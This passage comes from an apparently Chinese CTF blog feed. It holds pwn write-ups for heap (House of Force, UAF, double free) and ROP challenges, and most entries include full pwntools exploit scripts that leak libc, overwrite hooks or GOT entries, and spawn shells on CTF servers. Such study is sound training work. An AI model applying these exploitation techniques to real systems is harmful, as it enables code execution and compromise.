‘)<br>payload = p64(0x400d49) + p64(0x400d49)<br>add(0x10,payload)</p><h1 id="sla-‘choice-’-’5’"><a href="#sla-‘choice-’-’5’" class="headerlink" title="sla(‘choice:’,’5’)"></a>sla(‘choice:’,’5’)</h1><p>itr()</p><pre><code>## gyctf-2020-force### ida分析![][image-5]可以实现堆溢出。并且在你申请一个堆块以后，程序会给你打印出堆块的地址，这样就可以泄露出信息。### 利用思路- 申请一个很大堆，然后程序会mmap开启一个堆块，此时就可以泄漏出libc的地址。- HOF- `__malloc_hook` + one gadget### exp</code></pre><p>from pwn import *<br>import time<br>local_libc  = ‘/lib/x86_64-linux-gnu/libc.so.6’<br>local_file  = ‘./gyctf_2020_force’<br>remote_libc = local_libc # ‘../libc.so.6<br>debug = 0<br>if debug:<br>    io = process(local_file)<br>    context.log_level = ‘debug’<br>    libc = ELF(local_libc)<br>else:<br>    io = remote(‘node3.buuoj.cn’,29457)<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>libc = elf.libc<br>context.arch = elf.arch<br>context.terminal = [‘tmux’,’neww’]#,’’splitw’,’-h’<br>rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]<br>realloc = [0x2,0x4,0x6,0xB,0xC,0xD]<br>arae18 = 0x3ebca0<br>s      = lambda data               :io.send(data)<br>sa      = lambda delim,data         :io.sendafter(delim, data)<br>sl      = lambda data               :io.sendline(data)<br>sla     = lambda delim,data         :io.sendlineafter(delim, data)<br>sea     = lambda delim,data         :io.sendafter(delim, data)<br>r      = lambda numb=4096          :io.recv(numb)<br>ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)<br>uu32    = lambda data               :u32(data.ljust(4, ‘\0’))<br>uu64    = lambda data               :u64(data.ljust(8, ‘\0’))<br>info_addr = lambda tag, addr        :io.info(tag + ‘==&gt;’ +’: {:#x}’.format(addr))<br>itr     = lambda                    :io.interactive()<br>def dbg():<br>    # gdb.attach(proc.pidof(io)[0],gdbscript=’b main’)<br>    gdb.attach(io)<br>    pause()</p><p>def add(size,date):<br>    sla(‘2:puts’,’1’)<br>    sla(‘size’,str(size))<br>    ru(‘bin addr 0x’)<br>    heapaddr = int(r(12),16)<br>    info_addr(‘heapaddr’,heapaddr)<br>    sa(‘content’,str(date))<br>    return heapaddr<br>payload = 0x30 * ‘a’ + p64(0) + p64(0xffffffffffffffff)<br>libc_base = add(0x200000,’111’) + 0x200ff0<br>info_addr(‘libc_base’,libc_base)<br>malloc_hook = libc_base + 0x3c4b10<br>heapaddr = add(0x30,payload)<br>size = malloc_hook-(heapaddr + 0x30) - 0x10 - 0x8 -0x8 -0x8<br>print(‘size—-&gt;’+hex(size))<br>add(size,’a’)<br>rce = rce16[1] + libc_base<br>payload = p64(0) + p64(rce) + p64(libc_base + libc.symbols[‘__libc_realloc’] + realloc[1])<br>add(0x20,payload)<br>sla(‘2:puts’,’1’)<br>sla(‘size’,’30’)</p><h1 id="dbg"><a href="#dbg" class="headerlink" title="dbg()"></a>dbg()</h1><p>itr()</p><pre><code>## `bcloud_bctf_2016`这个题是一个十分精妙的题，漏洞出现在程序初始化。![][image-6]strcpy是以`\x00`来判断一个字符串是否结束的。在栈中，当输入0x40个字符时，因为v2正好在s下面，这就让strcpy从s往v2上面复制时会**把这个堆块的地址也给复制上去**，当其返回name时，也就返回了堆块地址，然后就可以算出堆块的基地址。![][image-7]![][image-8]到了这个也是这个漏洞，填充完0x40个字符后，会把org堆块的指针和v3里面的内容给复制到org对应的堆块里，也就是0x40 + 4 + len(v3)字节的东西。org在堆块排布中也是最后一个，如果传过去`0xffffffff`,就可以改到top chunk的size位。### 利用思路- leak堆块base- 修改top chunk size- hof到heaplist处- 给heaplist写上free got，用edit，修改其为puts- 泄漏libc地址- 修改free got 为system，然后指向`/bin/sh\x00`### exp</code></pre><p>from pwn import *<br>from LibcSearcher import *<br>import time<br>local_file  = ‘./bcloud_bctf_2016’<br>local_libc  = ‘/lib/x86_64-linux-gnu/libc.so.6’<br>remote_libc = local_libc # ‘../libc.so.6<br>debug = 0<br>if debug:<br>    io = process(local_file)<br>    context.log_level = ‘debug’<br>    libc = ELF(local_libc)<br>else:<br>    io = remote(‘node3.buuoj.cn’,27301)<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>libc = elf.libc<br>context.arch = elf.arch<br>context.terminal = [‘tmux’,’neww’]#,’’splitw’,’-h’<br>rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]<br>realloc = [0x2,0x4,0x6,0xB,0xC,0xD]<br>arae18 = 0x3ebca0<br>s      = lambda data               :io.send(data)<br>sa      = lambda delim,data         :io.sendafter(delim, data)<br>sl      = lambda data               :io.sendline(data)<br>sla     = lambda delim,data         :io.sendlineafter(delim, data)<br>sea     = lambda delim,data         :io.sendafter(delim, data)<br>r      = lambda numb=4096          :io.recv(numb)<br>ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)<br>uu32    = lambda data               :u32(data.ljust(4, ‘\0’))<br>uu64    = lambda data               :u64(data.ljust(8, ‘\0’))<br>info_addr = lambda tag, addr        :io.info(tag + ‘==&gt;’ +’: {:#x}’.format(addr))<br>itr     = lambda                    :io.interactive()<br>def debug():<br>    # gdb.attach(proc.pidof(io)[0],gdbscript=’b main’)<br>    gdb.attach(io)<br>    pause()</p><p>def name(name):<br>    sa(‘name’,str(name))<br>    ru(‘b’)<br>    heapbase = uu32(r(4)) - 0x8<br>    info_addr(‘heapbase’,heapbase)<br>    return heapbase<br>def org(org,host):<br>    sa(‘Org:’,str(org))<br>    sla(‘Host:’,str(host))</p><p>def add(size,content):<br>    sla(‘option—&gt;&gt;’,’1’)<br>    sla(‘length’,str(size))<br>    sa(‘content:’,str(content))</p><p>def edit(id,content):<br>    sla(‘—&gt;&gt;’,’3’)<br>    sla(‘id’,str(id))<br>    sa(‘the new content’,str(content))</p><p>def free(id):<br>    sla(‘-&gt;’,’4’)<br>    sla(‘id’,str(id))</p><p>context.log_level = ‘debug’</p><p>sizelist = 0x804B0A0<br>heaplist = 0x804B120<br>heapbase = name(‘a’ * (0x40-1) + ‘b’)<br>top = heapbase + 0xd8<br>info_addr(‘top’,top)<br>org(‘b’*0x40,p32(0xffffffff)) #chang top chunk size<br>size = heaplist - top - 0x10<br>add(size,’\n’)<br>add(0x18,’\n’)<br>payload = p32(0) + p32(elf.got[‘free’]) + p32(elf.got[‘atoi’])  +p32(0x804B128+4+4) + ‘/bin/sh\x00’<br>edit(1,payload + ‘\n’)<br>puts_plt = elf.plt[‘puts’]<br>edit(1,p32(puts_plt) + ‘\n’)<br>free(2)<br>io.recv(1)<br>io.recv(1)<br>atoi = uu32(r(4))<br>info_addr(‘atoi’,atoi)<br>libc = LibcSearcher(‘atoi’,atoi)<br>libc_base = atoi - libc.dump(‘atoi’)<br>system = libc_base + libc.dump(‘system’)<br>info_addr(‘libc_base’,libc_base)<br>edit(1,p32(system) + ‘\n’)<br>free(3)<br>itr()<br>```</p>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>House系列</tag>
      
      <tag>heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DASCTF安恒月赛(4th)</title>
    <link href="/2020/04/25/DASCTF%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B/"/>
    <url>/2020/04/25/DASCTF%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="DASCTF安恒月赛-pwn"><a href="#DASCTF安恒月赛-pwn" class="headerlink" title="DASCTF安恒月赛-pwn"></a>DASCTF安恒月赛-pwn</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>开赛了，有点事情没打，晚上复现了一下。</p><h2 id="echo-server"><a href="#echo-server" class="headerlink" title="echo-server"></a>echo-server</h2><pre><code class="python">[*] &#39;/ctf/work/ahys/echo server/test&#39;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><p>程序很简单，经典栈溢出，rop利用即可。<br>但是因为是64位的，并且是glibc2.27，发现在做的时候构造rop链总是会cursh，<br>调试发现：<br><img src="http://qiqianyun.chumen77.xyz/uPic/jfAEUD.png" srcset="/img/loading.gif" alt><br>发现这段汇编直接会让程序cursh，想起来ex师傅一篇文章分析过，64位程序rop到system拿shell的时候也会这样。但是很奇怪这个也出现了，索性尝试一波。<br>解决办法：还是加个ret，让栈对其即可。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *local_file  = &#39;./test&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc-2.27.so&#39;remote_libc = &#39;./libc.so.6&#39;debug = 1if debug:    io = process(local_file)    libc = ELF(local_libc)else:    # io = remote(&#39;node3.buuoj.cn&#39;,25390)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.log_level = &#39;debug&#39;context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]#,&#39;neww&#39;s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def dbg():    # gdb.attach(proc.pidof(io)[0],gdbscript=&quot;b main&quot;)    gdb.attach(io)    pause()pop_rdi = 0x0000000000400823# : pop rdi ; retoffset = 136start = 0x4005C0ret = 0x0400768sla(&#39;how long is your name:&#39;,&#39;500&#39;)payload = &#39;\x00&#39; * offset + flat([ret,pop_rdi,elf.got[&#39;read&#39;],elf.plt[&#39;printf&#39;],start])# dbg()sla(&#39;s you name?&#39;,payload)ru(&#39;hello &#39;)read = uu64(r(6))info_addr(&#39;printf&#39;,read)libc_base = read - libc.symbols[&#39;read&#39;]info_addr(&#39;libc_base&#39;,libc_base)binsh = libc_base  + libc.search(&quot;/bin/sh&quot;).next()system = libc_base + libc.sym[&#39;system&#39;]sla(&#39;how long is your name: &#39;,&#39;500&#39;)payload = &#39;\x00&#39; * offset + flat([ret,pop_rdi,binsh,system])# rec = 0x4f322 + libc_base# dbg()sla(&#39;s you name?&#39;,payload)itr()</code></pre><h2 id="入门reverse"><a href="#入门reverse" class="headerlink" title="入门reverse"></a>入门reverse</h2><pre><code class="python">s = &#39;akhb~chdaZrdaZudqduvdZvvv|&#39;flag = &#39;&#39;for i in range(26):    flag += chr((ord(s[i]) - 1) ^ 6)print(flag)</code></pre><h2 id="Encrypts"><a href="#Encrypts" class="headerlink" title="Encrypts"></a>Encrypts</h2><p>直接爆破了。</p><pre><code class="python">s = [38,44,33,39,59,35,34,115,117,114,113,33,36,117,118,119,35,120,38,114,117,113,38,34,113,114,117,114,36,112,115,118,121,112,35,37,121,61]for i in range(128):    flag = &#39;&#39;    for j in range(38):        flag += chr(s[j] ^ i)    if flag[:4] == &#39;flag&#39;:        print(flag)</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>re</tag>
      
      <tag>rop</tag>
      
      <tag>uaf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>uaf和double free</title>
    <link href="/2020/04/25/uaf%E5%92%8Cdouble%20free/"/>
    <url>/2020/04/25/uaf%E5%92%8Cdouble%20free/</url>
    
    <content type="html"><![CDATA[<h1 id="uaf和double-free"><a href="#uaf和double-free" class="headerlink" title="uaf和double free"></a>uaf和double free</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近开始打算入门堆，简单记录几道相关的题。</p><h2 id="hitcontraining-uaf"><a href="#hitcontraining-uaf" class="headerlink" title="hitcontraining-uaf"></a>hitcontraining-uaf</h2><p>题目较为简单存在后门函数，利用uaf漏洞攻击即可。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *local_file  = &#39;./hacknote&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;../libc.so.6&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,27892)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.log_level = &#39;debug&#39;context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]#,&#39;neww&#39;s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def dbg():    # gdb.attach(proc.pidof(io)[0],gdbscript=&quot;b main&quot;)    gdb.attach(io)    pause()def add(size,content):    sl(&#39;1&#39;)    ru(&#39;Note size &#39;)    sl(str(size))    ru(&#39;Content :&#39;)    sl(str(content))def dele(index):    sl(&#39;2&#39;)    sl(str(index))def show(index):    sl(&#39;3&#39;)    sl(str(index))ru(&#39;Your choice :&#39;)add(16,&#39;aaaa&#39;)ru(&#39;Your choice :&#39;)add(16,&#39;bbbb&#39;)ru(&#39;Your choice :&#39;)dele(0)ru(&#39;Your choice :&#39;)dele(1)ru(&#39;Your choice :&#39;)add(8,p32(elf.symbols[&#39;magic&#39;]))ru(&#39;Your choice :&#39;)show(0)itr()</code></pre><h2 id="ACTF-2019-babyheap"><a href="#ACTF-2019-babyheap" class="headerlink" title="ACTF_2019_babyheap"></a><code>ACTF_2019_babyheap</code></h2><p>题目有system函数，并且也有<code>/bin/sh\x00</code> ，当时在构造这个<code>/bin/sh\x00</code>的字符串指针的时候费了一点劲，结果发现elf有这个字符串。然后就很简单了，控制好参数即可。还是uaf漏洞进行攻击。</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *local_file  = &#39;./ACTF_2019_babyheap&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;../libc.so.6&#39;debug = 1 if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,27341)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.log_level = &#39;debug&#39;context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]#,&#39;neww&#39;s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def dbg():    # gdb.attach(proc.pidof(io)[0],gdbscript=&quot;b main&quot;)    gdb.attach(io)    pause()def add(size,content):    sla(&#39;Your choice: &#39;,&#39;1&#39;)    sla(&#39;size: \n&#39;,str(size))    sa(&#39;content: \n&#39;,str(content)) def dele(index):    sla(&#39;: &#39;,&#39;2&#39;)    sla(&#39;index: \n&#39;,str(index))def show(index):    sla(&#39;: &#39;,&#39;3&#39;)    sla(&#39;index: \n&#39;,str(index))add(32,&#39;aaaaaaaa&#39;) #0add(32,&#39;bbbbbbbb&#39;) #1dele(0)dele(1)binsh = 0x602010add(16,flat(binsh,elf.plt[&#39;system&#39;]))# dbg()show(0)itr()</code></pre><h2 id="actf-2019-message"><a href="#actf-2019-message" class="headerlink" title="actf-2019-message"></a>actf-2019-message</h2><p>Double free，迁移到伪造的堆块，注意控制好伪造堆块的size跟fastbin的对应。<br>改<code>__free_hook</code>为system即可。<code>__free_hook</code>的参数正好是堆块的date，较好控制。<br>（buu给的复现环境是18的，有了tcache机制，但是本人还不太熟悉，只是知道不检查size是否对应了，在16上做的，然后就调试改了改脚本，打通了buu的复现环境。下面的exp也是18的。）</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *local_file  = &#39;./ACTF_2019_message&#39;# local_libc  = &#39;/lib/x86_64-linux-gnu/libc-2.27.so&#39;# remote_libc = local_libc # &#39;../libc.so.6&#39;debug = 1if debug:    io = process(local_file)    # libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,25390)    # libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.log_level = &#39;debug&#39;context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]#,&#39;neww&#39;s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def dbg():    # gdb.attach(proc.pidof(io)[0],gdbscript=&quot;b main&quot;)    gdb.attach(io)    pause()def add(length,contend) :    sla(&#39;choice: &#39;,&#39;1&#39;)    sla(&#39;length of message:\n&#39;,str(length))    sa(&#39;message:\n&#39;,str(contend))def free(index):    sla(&#39;choice: &#39;,&#39;2&#39;)    sla(&#39;to delete:\n&#39;,str(index))def edit(index,contend):    sla(&#39;choice: &#39;,&#39;3&#39;)    sla(&#39;to edit:\n&#39;,str(index))    sa(&#39;the message:\n&#39;,str(contend))def show(index):    sla(&#39;choice: &#39;,&#39;4&#39;)    sla(&#39;to display:\n&#39;,str(index))add(0x30,&#39;a&#39;) #0add(0x20,&#39;a&#39;) #1add(0x20,&#39;a&#39;) #2free(1)free(2)free(1)add(0x20,p64(0x602068))add(0x20,&#39;aaaaaaaa&#39;)add(0x20,&#39;aaaaaaaa&#39;)contend = p64(elf.got[&#39;puts&#39;])# + p64(0x30) + p64(elf.got[&#39;puts&#39;])add(0x20,contend)show(0)ru(&#39; message: &#39;)puts = uu64(r(6))libc_base = puts - libc.symbols[&#39;puts&#39;]free_hook = libc_base + libc.symbols[&#39;__free_hook&#39;]print(&#39;puts&#39; + hex(puts))print(&#39;libc_base&#39; + hex(libc_base))system = libc_base + libc.symbols[&#39;system&#39;]contend = p64(free_hook)dbg()edit(6,contend)# dbg()contend = p64(system)edit(0,contend)# dbg()add(0x8,&#39;/bin/sh\x00&#39;)free(7)itr()</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>学习记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwntools的gdb.attach</title>
    <link href="/2020/04/20/pwntools%E7%9A%84gdb.attach/"/>
    <url>/2020/04/20/pwntools%E7%9A%84gdb.attach/</url>
    
    <content type="html"><![CDATA[<h1 id="pwntools的gdb-attach"><a href="#pwntools的gdb-attach" class="headerlink" title="pwntools的gdb.attach"></a>pwntools的gdb.attach</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在尝试学着更快的调试exp，很早就了解到这个gdb.attach，但是本人是ssh连上去的，根本用不了。然后尝试tmux这个神器，来实现gdb.attach。成功以后发现一个不好的点，pwntools gdb.attach上的gdb调试中，很多函数是没有符号表的，调试起来反而难度增加。<br><img src="http://qiqianyun.chumen77.xyz/uPic/QGWqDH.png" srcset="/img/loading.gif" alt><br>自己手动gdb.attach上去。<br><img src="http://qiqianyun.chumen77.xyz/uPic/acimnJ.png" srcset="/img/loading.gif" alt><br>然后发现谷歌也谷歌不出来，就来折腾源码了。<br><strong>版本号 ：pwntools (4.0.1)</strong></p><h2 id="改善"><a href="#改善" class="headerlink" title="改善"></a>改善</h2><p>因为正常本人都是</p><pre><code>chumen77@chumen-77:~$ gdb at pid</code></pre><p>这样来进行attach。<br><img src="http://qiqianyun.chumen77.xyz/uPic/JxHuUC.png" srcset="/img/loading.gif" alt><br>发现用pwntools时候，它进行的命令是这样的，然后思路就来了找到相关源码，改一下就好了。</p><h3 id="找关键处"><a href="#找关键处" class="headerlink" title="找关键处"></a>找关键处</h3><pre><code>/running in new terminal</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/8T9BqG.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/BlYHnW.png" srcset="/img/loading.gif" alt><br>删除2行和修改一行代码（<code>-q 改成 at</code>）即可。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/XUD2ZW.png" srcset="/img/loading.gif" alt><br>发现已经可以了。</p>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>杂项</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Ropemporium 通关记录</title>
    <link href="/2020/04/13/Ropemporium%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"/>
    <url>/2020/04/13/Ropemporium%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="Ropemporium-通关记录"><a href="#Ropemporium-通关记录" class="headerlink" title="Ropemporium 通关记录"></a>Ropemporium 通关记录</h1><h2 id="ret2win"><a href="#ret2win" class="headerlink" title="ret2win"></a>ret2win</h2><h3 id="保护和arch"><a href="#保护和arch" class="headerlink" title="保护和arch"></a>保护和arch</h3><pre><code>    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><h3 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h3><p>题目给了提示，32的buf却可以填充50个字节。并且接受用的是fgets，这个函数不用担心空字节。</p><pre><code class="c">int ret2win(){  printf(&quot;Thank you! Here&#39;s your flag:&quot;);  return system(&quot;/bin/cat flag.txt&quot;);}</code></pre><p>并且存在漏洞函数。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><h4 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h4><pre><code class="python">from pwn import *context.arch = &#39;i386&#39;io = process(&#39;./ret2win32&#39;)io.recvuntil(&#39;&gt;&#39;)payload = &#39;a&#39; * 44 + p32(0x08048659)io.sendline(payload)io.interactive()</code></pre><h4 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h4><pre><code class="python">from pwn import *context.arch = &#39;amd64&#39;io = process(&#39;./ret2win&#39;)io.recvuntil(&#39;&gt;&#39;)payload = &#39;a&#39; * 40 + p64(0x00000400811)io.sendline(payload)io.interactive()</code></pre><h2 id="split"><a href="#split" class="headerlink" title="split"></a>split</h2><h3 id="保护和arch-1"><a href="#保护和arch-1" class="headerlink" title="保护和arch"></a>保护和arch</h3><pre><code>    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><h3 id="ida分析-1"><a href="#ida分析-1" class="headerlink" title="ida分析"></a>ida分析</h3><pre><code class="c">int usefulFunction(){  return system(&quot;/bin/ls&quot;);}</code></pre><p>后门函数变成了这样，但是可以看到有cat flag的字符串。这样只需要控制system的参数即可。<br><img src="http://qiqianyun.chumen77.xyz/uPic/aPvOxL.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/qQOFlI.png" srcset="/img/loading.gif" alt></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><h4 id="32位："><a href="#32位：" class="headerlink" title="32位："></a>32位：</h4><pre><code class="python">from pwn import *context.arch = &#39;i386&#39;io = process(&#39;./split32&#39;)key = 0x0804A030 # /bin/cat flag.txt&#39;io.recvuntil(&#39;&gt;&#39;)offset = 44payload = &#39;a&#39; * offset + p32(0x08048657) + p32(0x0804A030)raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.interactive()</code></pre><h4 id="64位："><a href="#64位：" class="headerlink" title="64位："></a>64位：</h4><pre><code class="python">from pwn import *context.arch = &#39;amd64&#39;io = process(&#39;./split&#39;)io.recvuntil(&#39;&gt;&#39;)key = 0x00601060 # /bin/cat flag.txt&#39;offset = 40pop_rdi_ret = 0x0000000000400883payload = &#39;a&#39; * offset + p64(pop_rdi_ret) + p64(key) + p64(0x00000400810) io.sendline(payload)io.interactive()</code></pre><h2 id="callme"><a href="#callme" class="headerlink" title="callme"></a>callme</h2><h3 id="ida分析-2"><a href="#ida分析-2" class="headerlink" title="ida分析"></a>ida分析</h3><pre><code class="c">void __noreturn usefulFunction(){  callme_three(4LL, 5LL, 6LL);  callme_two(4LL, 5LL, 6LL);  callme_one(4LL, 5LL, 6LL);  exit(1);}</code></pre><p>这个是关键函数，但是其是用到了给的so文件，然后ida来分析so文件。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/FgKhVy.png" srcset="/img/loading.gif" alt><br>找到以后发现应该是按照顺序调用<code>callme-one，callme-two，callme-three</code>需要注意其参数都要是1，2，3.当初程序中给的是4，5，6 需要想办法来换掉这个参数。</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><h4 id="32位：-1"><a href="#32位：-1" class="headerlink" title="32位："></a>32位：</h4><pre><code class="python">from pwn import *context.arch = &#39;i386&#39;io = process(&#39;./callme32&#39;)io.recvuntil(&#39;&gt;&#39;)offset = 44callme_one = 0x080485C0callme_two = 0x08048620callme_three = 0x080485B0pop3_ret = 0x080488a9payload = &#39;a&#39; * offset + p32(callme_one) + p32(pop3_ret) + p32(1) + p32(2) + p32(3)payload += p32(callme_two) + p32(pop3_ret) + p32(1) + p32(2) + p32(3)payload += p32(callme_three) + p32(0xdeadbeef) + p32(1) + p32(2) + p32(3)raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.interactive()</code></pre><p>其中<code>pop3_ret</code> 是用来保持栈平衡的，且站的位置函数的返回地址。还有需要注意的问题是：<br><img src="http://qiqianyun.chumen77.xyz/uPic/9PV8oL.png" srcset="/img/loading.gif" alt><br>注意填充以后的返回地址填的时候，通常填的是代码段的数据，但是这里汇编是<code>call</code>所以在填的时候，应该是填充其plt的地址。<br><img src="http://qiqianyun.chumen77.xyz/uPic/HxXaWe.png" srcset="/img/loading.gif" alt></p><h4 id="64位：-1"><a href="#64位：-1" class="headerlink" title="64位："></a>64位：</h4><pre><code class="python">from pwn import *context.arch = &#39;amd64&#39;io = process(&#39;./callme&#39;)io.recvuntil(&#39;&gt;&#39;)offset = 40callme_one = 0x00401850callme_two = 0x000401870callme_three = 0x00401810pop3_ret = 0x0000000000401ab0payload = &#39;a&#39; * offset + p64(pop3_ret) + p64(1) + p64(2) + p64(3) + p64(callme_one)payload += p64(pop3_ret) + p64(1) + p64(2) + p64(3) + p64(callme_two)payload += p64(pop3_ret) + p64(1) + p64(2) + p64(3) + p64(callme_three)raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.interactive()</code></pre><p>利用 <code>0x0000000000401ab0 : pop rdi ; pop rsi ; pop rdx ; ret</code>这个gadget来控制参数。</p><h2 id="write4"><a href="#write4" class="headerlink" title="write4"></a>write4</h2><h3 id="ida分析-3"><a href="#ida分析-3" class="headerlink" title="ida分析"></a>ida分析</h3><p>这个题跟前面第2题很像，但是就是没有给你<code>cat flag</code> 的字符串了。需要自己用程序的gadget来构造。思路也就是进行rop把<code>/bin/sh</code>往bss段上写,然后接着拿shell就好了。</p><pre><code>ROPgadget --binary ./write4 --only &quot;mov|pop|ret&quot;</code></pre><p><strong>查好用的gadgets：</strong><br><img src="http://qiqianyun.chumen77.xyz/uPic/pY6tBk.png" srcset="/img/loading.gif" alt><br>利用这即可就可以了，32位的类似。</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><h4 id="32位：-2"><a href="#32位：-2" class="headerlink" title="32位："></a>32位：</h4><pre><code class="python">from pwn import *context.arch = &#39;i386&#39;io = process(&#39;./write432&#39;)io.recvuntil(&#39;&gt;&#39;)elf = ELF(&#39;./write432&#39;)# bin_sh = elf.search(&#39;/bin/cat&#39;).next()offset = 44bss = 0x804A06C-0x10pop_edi_pop_ebp_ret = 0x080486dasystem = 0x8048430key = 0x08048670 #mov dword ptr [edi], ebp ; retpayload = &#39;a&#39; * offset + flat([pop_edi_pop_ebp_ret,bss,&#39;sh\x00\x00&#39;,key,system,0xdeadbeef,bss])raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.interactive()</code></pre><h4 id="64位：-2"><a href="#64位：-2" class="headerlink" title="64位："></a>64位：</h4><pre><code class="python">from pwn import *context.arch = &#39;amd64&#39;io = process(&#39;./write4&#39;)io.recvuntil(&#39;&gt;&#39;)elf = ELF(&#39;./write4&#39;)# bin_sh = 